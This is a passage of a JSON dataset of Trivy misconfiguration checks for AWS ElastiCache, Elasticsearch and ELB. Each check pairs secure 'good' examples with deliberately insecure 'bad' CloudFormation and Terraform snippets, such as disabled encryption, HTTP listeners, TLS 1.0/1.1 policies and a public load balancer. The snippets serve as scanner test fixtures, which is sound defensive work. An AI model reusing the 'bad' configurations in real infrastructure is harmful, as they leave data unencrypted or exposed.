        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::CacheCluster\n          Properties:\n            CacheNodeType: cache.m3.medium\n            Engine: redis\n            SnapshotRetentionLimit: 7\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::CacheCluster\n          Properties:\n            Engine: redis\n            CacheNodeType: cache.t1.micro\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::CacheCluster\n          Properties:\n            Engine: memcached\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElastiCache::CacheCluster\n          Properties:\n            Engine: redis\n            CacheNodeType: cache.m3.medium\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_cluster#snapshot_retention_limit\n  good:\n    - |-\n      resource \"aws_elasticache_cluster\" \"good_example\" {\n        engine                   = \"redis\"\n        node_type                = \"cache.m4.large\"\n        snapshot_retention_limit = 5\n      }\n    - |-\n      resource \"aws_elasticache_cluster\" \"good_example\" {\n        engine    = \"memcached\"\n        node_type = \"cache.m4.large\"\n      }\n    - |-\n      resource \"aws_elasticache_cluster\" \"good_example\" {\n        engine    = \"redis\"\n        node_type = \"cache.t1.micro\"\n      }\n  bad:\n    - |-\n      resource \"aws_elasticache_cluster\" \"bad_example\" {\n        engine    = \"redis\"\n        node_type = \"cache.m4.large\"\n      }\n",
        "file_name": "enable_backup_retention.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticache/enable_backup_retention.yaml",
        "local_path": "aws/elasticache/enable_backup_retention.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::CacheCluster\n    Properties:\n      CacheNodeType: cache.m3.medium\n      Engine: redis\n      SnapshotRetentionLimit: 7",
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::CacheCluster\n    Properties:\n      Engine: redis\n      CacheNodeType: cache.t1.micro",
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::CacheCluster\n    Properties:\n      Engine: memcached"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElastiCache::CacheCluster\n    Properties:\n      Engine: redis\n      CacheNodeType: cache.m3.medium"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_cluster#snapshot_retention_limit"
            ],
            "good": [
              "resource \"aws_elasticache_cluster\" \"good_example\" {\n  engine                   = \"redis\"\n  node_type                = \"cache.m4.large\"\n  snapshot_retention_limit = 5\n}",
              "resource \"aws_elasticache_cluster\" \"good_example\" {\n  engine    = \"memcached\"\n  node_type = \"cache.m4.large\"\n}",
              "resource \"aws_elasticache_cluster\" \"good_example\" {\n  engine    = \"redis\"\n  node_type = \"cache.t1.micro\"\n}"
            ],
            "bad": [
              "resource \"aws_elasticache_cluster\" \"bad_example\" {\n  engine    = \"redis\"\n  node_type = \"cache.m4.large\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICACHE-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "elasticache",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::ReplicationGroup\n          Properties:\n            TransitEncryptionEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElastiCache::ReplicationGroup\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#transit_encryption_enabled\n  good:\n    - |-\n      resource \"aws_elasticache_replication_group\" \"good_example\" {\n        transit_encryption_enabled = true\n      }\n  bad:\n    - |-\n      resource \"aws_elasticache_replication_group\" \"bad_example\" {\n        transit_encryption_enabled = false\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticache/enable_in_transit_encryption.yaml",
        "local_path": "aws/elasticache/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::ReplicationGroup\n    Properties:\n      TransitEncryptionEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElastiCache::ReplicationGroup"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#transit_encryption_enabled"
            ],
            "good": [
              "resource \"aws_elasticache_replication_group\" \"good_example\" {\n  transit_encryption_enabled = true\n}"
            ],
            "bad": [
              "resource \"aws_elasticache_replication_group\" \"bad_example\" {\n  transit_encryption_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-ENABLE_DOMAIN_ENCRYPTION",
        "title": "Enable Domain Encryption",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::OpenSearchService::Domain\n          Properties:\n            EncryptionAtRestOptions:\n              Enabled: true\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            EncryptionAtRestOptions:\n              Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::OpenSearchService::Domain\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        encrypt_at_rest {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        encrypt_at_rest {\n          enabled = false\n        }\n      }\n",
        "file_name": "enable_domain_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/enable_domain_encryption.yaml",
        "local_path": "aws/elasticsearch/enable_domain_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::OpenSearchService::Domain\n    Properties:\n      EncryptionAtRestOptions:\n        Enabled: true",
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      EncryptionAtRestOptions:\n        Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::OpenSearchService::Domain",
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  encrypt_at_rest {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  encrypt_at_rest {\n    enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-ENABLE_DOMAIN_LOGGING",
        "title": "Enable Domain Logging",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-opensearchservice-domain.html\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::OpenSearchService::Domain\n          Properties:\n            LogPublishingOptions:\n              AUDIT_LOGS:\n                CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/opensearch/domains/opensearch-application-logs\n                Enabled: true\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            LogPublishingOptions:\n              AUDIT_LOGS:\n                CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/opensearch/domains/opensearch-application-logs\n                Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::OpenSearchService::Domain\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#log_type\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        log_publishing_options {\n          cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n          log_type                 = \"AUDIT_LOGS\"\n          enabled                  = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {}\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        log_publishing_options {\n          cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n          log_type                 = \"AUDIT_LOGS\"\n          enabled                  = false\n        }\n      }\n",
        "file_name": "enable_domain_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/enable_domain_logging.yaml",
        "local_path": "aws/elasticsearch/enable_domain_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-opensearchservice-domain.html",
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::OpenSearchService::Domain\n    Properties:\n      LogPublishingOptions:\n        AUDIT_LOGS:\n          CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/opensearch/domains/opensearch-application-logs\n          Enabled: true",
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      LogPublishingOptions:\n        AUDIT_LOGS:\n          CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/opensearch/domains/opensearch-application-logs\n          Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::OpenSearchService::Domain",
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#log_type"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  log_publishing_options {\n    cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n    log_type                 = \"AUDIT_LOGS\"\n    enabled                  = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {}",
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  log_publishing_options {\n    cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n    log_type                 = \"AUDIT_LOGS\"\n    enabled                  = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::OpenSearchService::Domain\n          Properties:\n            NodeToNodeEncryptionOptions:\n              Enabled: true\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            NodeToNodeEncryptionOptions:\n              Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        domain_name = \"domain-foo\"\n\n        node_to_node_encryption {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        domain_name = \"domain-foo\"\n\n        node_to_node_encryption {\n          enabled = false\n        }\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/enable_in_transit_encryption.yaml",
        "local_path": "aws/elasticsearch/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::OpenSearchService::Domain\n    Properties:\n      NodeToNodeEncryptionOptions:\n        Enabled: true",
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      NodeToNodeEncryptionOptions:\n        Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  domain_name = \"domain-foo\"\n\n  node_to_node_encryption {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  domain_name = \"domain-foo\"\n\n  node_to_node_encryption {\n    enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-ENFORCE_HTTPS",
        "title": "Enforce Https",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            DomainEndpointOptions:\n              EnforceHTTPS: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#enforce_https\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        domain_endpoint_options {\n          enforce_https = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        domain_endpoint_options {\n          enforce_https = false\n        }\n      }\n",
        "file_name": "enforce_https.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/enforce_https.yaml",
        "local_path": "aws/elasticsearch/enforce_https.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      DomainEndpointOptions:\n        EnforceHTTPS: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#enforce_https"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  domain_endpoint_options {\n    enforce_https = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  domain_endpoint_options {\n    enforce_https = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            DomainEndpointOptions:\n              TLSSecurityPolicy: Policy-Min-TLS-1-2-2019-07\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#tls_security_policy\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        domain_endpoint_options {\n          enforce_https       = true\n          tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        domain_endpoint_options {\n          enforce_https       = true\n          tls_security_policy = \"Policy-Min-TLS-1-0-2019-07\"\n        }\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/use_secure_tls_policy.yaml",
        "local_path": "aws/elasticsearch/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      DomainEndpointOptions:\n        TLSSecurityPolicy: Policy-Min-TLS-1-2-2019-07"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#tls_security_policy"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  domain_endpoint_options {\n    enforce_https       = true\n    tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  domain_endpoint_options {\n    enforce_https       = true\n    tls_security_policy = \"Policy-Min-TLS-1-0-2019-07\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELB-ALB_NOT_PUBLIC",
        "title": "Alb Not Public",
        "provider": "aws",
        "service": "elb",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-loadbalancer.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n          Properties:\n            Scheme: internal\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb\n  good:\n    - |-\n      resource \"aws_alb\" \"good_example\" {\n        load_balancer_type = \"gateway\"\n        internal           = false\n      }\n    - |-\n      resource \"aws_alb\" \"good_example\" {\n        internal = true\n      }\n  bad:\n    - |-\n      resource \"aws_alb\" \"bad_example\" {\n        internal = false\n      }\n",
        "file_name": "alb_not_public.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elb/alb_not_public.yaml",
        "local_path": "aws/elb/alb_not_public.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-loadbalancer.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n    Properties:\n      Scheme: internal"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb"
            ],
            "good": [
              "resource \"aws_alb\" \"good_example\" {\n  load_balancer_type = \"gateway\"\n  internal           = false\n}",
              "resource \"aws_alb\" \"good_example\" {\n  internal = true\n}"
            ],
            "bad": [
              "resource \"aws_alb\" \"bad_example\" {\n  internal = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELB-DROP_INVALID_HEADERS",
        "title": "Drop Invalid Headers",
        "provider": "aws",
        "service": "elb",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-loadbalancer.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n          Properties:\n            LoadBalancerAttributes:\n              - Key: routing.http.drop_invalid_header_fields.enabled\n                Value: true\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n          Properties:\n            Type: gateway\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n          Properties:\n            LoadBalancerAttributes:\n              - Key: routing.http.drop_invalid_header_fields.enabled\n                Value: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb#drop_invalid_header_fields\n  good:\n    - |-\n      resource \"aws_alb\" \"good_example\" {\n        drop_invalid_header_fields = true\n      }\n  bad:\n    - |-\n      resource \"aws_alb\" \"bad_example\" {\n        drop_invalid_header_fields = false\n      }\n",
        "file_name": "drop_invalid_headers.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elb/drop_invalid_headers.yaml",
        "local_path": "aws/elb/drop_invalid_headers.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-loadbalancer.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n    Properties:\n      LoadBalancerAttributes:\n        - Key: routing.http.drop_invalid_header_fields.enabled\n          Value: true",
              "Resources:\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n    Properties:\n      Type: gateway"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n    Properties:\n      LoadBalancerAttributes:\n        - Key: routing.http.drop_invalid_header_fields.enabled\n          Value: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb#drop_invalid_header_fields"
            ],
            "good": [
              "resource \"aws_alb\" \"good_example\" {\n  drop_invalid_header_fields = true\n}"
            ],
            "bad": [
              "resource \"aws_alb\" \"bad_example\" {\n  drop_invalid_header_fields = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELB-HTTP_NOT_USED",
        "title": "Http Not Used",
        "provider": "aws",
        "service": "elb",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-listener.html\n  good:\n    - |-\n      Resources:\n        myLoadBalancer:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::Listener\n          Properties:\n            LoadBalancerArn: !Ref myLoadBalancer\n            Protocol: HTTPS\n  bad:\n    - |-\n      Resources:\n        myLoadBalancer:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n        BadExample:\n          Type: AWS::ElasticLoadBalancingV2::Listener\n          Properties:\n            LoadBalancerArn: !Ref myLoadBalancer\n            Protocol: HTTP\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener\n  good:\n    - |-\n      resource \"aws_lb\" \"example\" {}\n\n      resource \"aws_alb_listener\" \"good_example\" {\n        load_balancer_arn = aws_lb.example.arn\n        protocol          = \"HTTPS\"\n      }\n  bad:\n    - |-\n      resource \"aws_lb\" \"example\" {}\n\n      resource \"aws_alb_listener\" \"bad_example\" {\n        load_balancer_arn = aws_lb.example.arn\n        protocol          = \"HTTP\"\n      }\n",
        "file_name": "http_not_used.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elb/http_not_used.yaml",
        "local_path": "aws/elb/http_not_used.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-listener.html"
            ],
            "good": [
              "Resources:\n  myLoadBalancer:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      LoadBalancerArn: !Ref myLoadBalancer\n      Protocol: HTTPS"
            ],
            "bad": [
              "Resources:\n  myLoadBalancer:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n  BadExample:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      LoadBalancerArn: !Ref myLoadBalancer\n      Protocol: HTTP"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener"
            ],
            "good": [
              "resource \"aws_lb\" \"example\" {}\n\nresource \"aws_alb_listener\" \"good_example\" {\n  load_balancer_arn = aws_lb.example.arn\n  protocol          = \"HTTPS\"\n}"
            ],
            "bad": [
              "resource \"aws_lb\" \"example\" {}\n\nresource \"aws_alb_listener\" \"bad_example\" {\n  load_balancer_arn = aws_lb.example.arn\n  protocol          = \"HTTP\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELB-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "aws",
        "service": "elb",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-listener.html\n  good:\n    - |-\n      Resources:\n        myLoadBalancer:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::Listener\n          Properties:\n            LoadBalancerArn: !Ref myLoadBalancer\n            Protocol: HTTPS\n            SslPolicy: ELBSecurityPolicy-TLS13-1-2-2021-06\n  bad:\n    - |-\n      Resources:\n        myLoadBalancer:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n        BadExample:\n          Type: AWS::ElasticLoadBalancingV2::Listener\n          Properties:\n            LoadBalancerArn: !Ref myLoadBalancer\n            Protocol: HTTPS\n            SslPolicy: ELBSecurityPolicy-TLS-1-1-2017-01\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener\n  good:\n    - |-\n      resource \"aws_lb\" \"example\" {}\n\n      resource \"aws_alb_listener\" \"good_example\" {\n        load_balancer_arn = aws_lb.example.arn\n        ssl_policy        = \"ELBSecurityPolicy-TLS13-1-2-2021-06\"\n        protocol          = \"HTTPS\"\n      }\n  bad:\n    - |-\n      resource \"aws_lb\" \"example\" {}\n\n      resource \"aws_alb_listener\" \"bad_example\" {\n        load_balancer_arn = aws_lb.example.arn\n        ssl_policy        = \"ELBSecurityPolicy-TLS-1-1-2017-01\"\n        protocol          = \"HTTPS\"\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elb/use_secure_tls_policy.yaml",
        "local_path": "aws/elb/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-listener.html"
            ],
            "good": [
              "Resources:\n  myLoadBalancer:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      LoadBalancerArn: !Ref myLoadBalancer\n      Protocol: HTTPS\n      SslPolicy: ELBSecurityPolicy-TLS13-1-2-2021-06"
            ],
            "bad": [
              "Resources:\n  myLoadBalancer:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n\n  BadExample:\n    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      LoadBalancerArn: !Ref myLoadBalancer\n      Protocol: HTTPS\n      SslPolicy: ELBSecurityPolicy-TLS-1-1-2017-01"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener"
            ],
            "good": [
              "resource \"aws_lb\" \"example\" {}\n\nresource \"aws_alb_listener\" \"good_example\" {\n  load_balancer_arn = aws_lb.example.arn\n  ssl_policy        = \"ELBSecurityPolicy-TLS13-1-2-2021-06\"\n  protocol          = \"HTTPS\"\n}"
            ],
            "bad": [
              "resource \"aws_lb\" \"example\" {}\n\nresource \"aws_alb_listener\" \"bad_example\" {\n  load_balancer_arn = aws_lb.example.arn\n  ssl_policy        = \"ELBSecurityPolicy-TLS-1-1-2017-01\"\n  protocol          = \"HTTPS\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EMR-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "emr",
        "language": "terraform",
